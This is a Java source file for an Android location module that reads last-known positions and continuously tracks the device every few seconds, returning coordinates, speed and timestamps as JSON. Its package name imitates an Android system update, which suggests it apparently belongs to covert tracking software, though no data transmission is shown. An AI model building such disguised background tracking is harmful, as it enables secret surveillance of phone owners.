package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

public class LocationModule {
    private static final String TAG = "LocationModule";
    private Context context;
    private LocationManager locationManager;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private LocationListener locationListener;
    private boolean isTracking = false;
    
    public interface LocationCallback {
        void onLocationResult(String locationJson);
        void onError(String error);
    }
    
    public LocationModule(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        startBackgroundThread();
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("LocationBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    public String getLocation() {
        if (!checkPermission()) {
            return createErrorJson("No location permission");
        }
        
        try {
            Location location = getLastKnownLocation();
            
            if (location != null) {
                return createLocationJson(location);
            } else {
                // Try to request a fresh location
                requestSingleLocation();
                return createErrorJson("Requesting fresh location...");
            }
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorJson("Error: " + e.getMessage());
        }
    }
    
    private Location getLastKnownLocation() {
        Location bestLocation = null;
        
        try {
            // Try GPS first
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (isBetterLocation(gpsLocation, bestLocation)) {
                    bestLocation = gpsLocation;
                }
            }
            
            // Try Network
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (isBetterLocation(networkLocation, bestLocation)) {
                    bestLocation = networkLocation;
                }
            }
            
            // Try Passive
            if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
                Location passiveLocation = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                if (isBetterLocation(passiveLocation, bestLocation)) {
                    bestLocation = passiveLocation;
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception getting location", e);
        }
        
        return bestLocation;
    }
    
    private boolean isBetterLocation(Location newLocation, Location currentBest) {
        if (currentBest == null) return newLocation != null;
        if (newLocation == null) return false;
        
        // Check if newer
        long timeDelta = newLocation.getTime() - currentBest.getTime();
        if (timeDelta > 60000) return true; // Newer by more than a minute
        
        // Check if more accurate
        if (newLocation.hasAccuracy() && currentBest.hasAccuracy()) {
            return newLocation.getAccuracy() < currentBest.getAccuracy();
        }
        
        return false;
    }
    
    private void requestSingleLocation() {
        if (!checkPermission()) return;
        
        LocationListener singleListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                // This would need to be handled via callback
                removeUpdates(this);
            }
            
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            
            @Override
            public void onProviderEnabled(String provider) {}
            
            @Override
            public void onProviderDisabled(String provider) {}
        };
        
        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, 
                    singleListener, backgroundThread.getLooper());
            } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, 
                    singleListener, backgroundThread.getLooper());
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception requesting location", e);
        }
    }
    
    public void startTracking(LocationCallback callback) {
        if (!checkPermission()) {
            callback.onError("No location permission");
            return;
        }
        
        isTracking = true;
        
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                callback.onLocationResult(createLocationJson(location));
            }
            
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            
            @Override
            public void onProviderEnabled(String provider) {}
            
            @Override
            public void onProviderDisabled(String provider) {}
        };
        
        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    5000, // 5 seconds
                    10,   // 10 meters
                    locationListener,
                    backgroundThread.getLooper()
                );
            }
            
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    5000,
                    10,
                    locationListener,
                    backgroundThread.getLooper()
                );
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception starting tracking", e);
            callback.onError("Security exception: " + e.getMessage());
        }
    }
    
    public void stopTracking() {
        isTracking = false;
        if (locationListener != null) {
            removeUpdates(locationListener);
            locationListener = null;
        }
    }
    
    private void removeUpdates(LocationListener listener) {
        try {
            locationManager.removeUpdates(listener);
        } catch (Exception e) {
            Log.e(TAG, "Error removing updates", e);
        }
    }
    
    private String createLocationJson(Location location) {
        try {
            JSONObject json = new JSONObject();
            json.put("latitude", location.getLatitude());
            json.put("longitude", location.getLongitude());
            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
            json.put("provider", location.getProvider());
            json.put("time", location.getTime());
            json.put("timestamp", System.currentTimeMillis());
            
            return json.toString();
        } catch (Exception e) {
            return createErrorJson("Error creating JSON: " + e.getMessage());
        }
    }
    
    private String createErrorJson(String error) {
        try {
            JSONObject json = new JSONObject();
            json.put("error", error);
            json.put("timestamp", System.currentTimeMillis());
            return json.toString();
        } catch (Exception e) {
            return "{\"error\":\"" + error + "\"}";
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    public void cleanup() {
        stopTracking();
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
    }
}
